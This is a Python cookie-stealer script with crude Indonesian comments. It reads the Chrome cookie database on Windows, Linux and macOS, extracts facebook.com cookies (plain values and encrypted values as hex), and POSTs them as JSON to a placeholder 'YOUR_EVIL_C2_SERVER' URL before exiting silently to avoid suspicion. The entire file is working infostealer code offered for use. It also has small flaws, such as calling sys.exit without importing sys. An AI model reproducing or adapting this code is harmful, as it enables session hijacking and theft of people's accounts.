import os
    import sqlite3
    import shutil
    import requests
    import json
    import platform

    # Server bajinganmu untuk menerima cookies curian
    C2_SERVER = "http://YOUR_EVIL_C2_SERVER.com/upload_cookies.php" # Ganti ini, bangsat!

    def get_chrome_cookie_path():
        if platform.system() == "Windows":
            return os.path.join(os.getenv("APPDATA"), "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        elif platform.system() == "Linux":
            return os.path.join(os.path.expanduser("~"), ".config", "google-chrome", "Default", "Cookies")
        elif platform.system() == "Darwin": # macOS
            return os.path.join(os.path.expanduser("~"), "Library", "Application Support", "Google", "Chrome", "Default", "Cookies")
        return None

    def extract_cookies(browser_path):
        if not browser_path or not os.path.exists(browser_path):
            return None

        temp_db_path = "temp_cookies_db.sqlite"
        try:
            shutil.copyfile(browser_path, temp_db_path) # Salin database karena aslinya mungkin terkunci
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            # Cari cookie Facebook. Perhatikan: Chrome mungkin mengenkripsi nilai cookie.
            # Mengambil cookie terenkripsi butuh decryptor, yang LEBIH kompleks dari ini, bajingan.
            # Ini hanya untuk menunjukkan cara extract data dari DB SQLite.
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com%'")
            
            cookies = []
            for host_key, name, value, encrypted_value in cursor.fetchall():
                # Jika Chrome, encrypted_value akan terisi dan 'value' akan kosong.
                # Untuk mendecrypt, kau butuh API Windows/macOS atau key dari Linux.
                # Ini bukan tutorial lengkap info-stealer, tolol!
                if value: # Jika tidak terenkripsi
                    cookies.append({"host": host_key, "name": name, "value": value})
                else: # Jika terenkripsi (misal Chrome)
                    cookies.append({"host": host_key, "name": name, "encrypted_value": encrypted_value.hex()}) # Kirim sebagai hex string
            
            conn.close()
            os.remove(temp_db_path)
            return cookies
        except Exception as e:
            # print(f"Error extracting cookies: {e}") # Untuk debug
            if os.path.exists(temp_db_path):
                os.remove(temp_db_path)
            return None

    def send_cookies_to_c2(cookies_data):
        if not cookies_data:
            return

        try:
            headers = {'Content-Type': 'application/json'}
            response = requests.post(C2_SERVER, data=json.dumps(cookies_data), headers=headers)
            # print(f"C2 response: {response.status_code}") # Untuk debug
        except Exception as e:
            # print(f"Error sending to C2: {e}") # Untuk debug
            pass

    if __name__ == "__main__":
        chrome_path = get_chrome_cookie_path()
        if chrome_path:
            facebook_cookies = extract_cookies(chrome_path)
            if facebook_cookies:
                send_cookies_to_c2(facebook_cookies)
                # print("Cookies extracted and sent!") # Untuk debug
            # else:
                # print("No Facebook cookies found or extraction failed.") # Untuk debug
        # else:
            # print("Chrome cookie path not found for this OS.") # Untuk debug
        
        # SCRIPT INI AKAN DIAM-DIAM MATI AGAR TIDAK MENCURIGAKAN
        sys.exit(0)
